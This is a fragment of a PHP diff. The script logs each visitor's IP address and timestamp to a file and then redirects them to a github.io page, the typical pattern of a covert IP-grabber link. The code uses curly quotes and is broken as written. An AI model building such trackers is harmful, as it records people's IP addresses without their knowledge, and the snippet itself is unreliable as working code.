@@ -5,5 +5,5 @@ $file=fopen(“ip_log.txt“,”a”);
 $data = $ip.’ ‘.$dt.”\n”;
 fwrite($file, $data);
 fclose($file);
-header( ‘Location: ‘ ) ;
+header( ‘Location: https://bladderr.github.io/Casateuwu/‘ ) ; 
 ?>
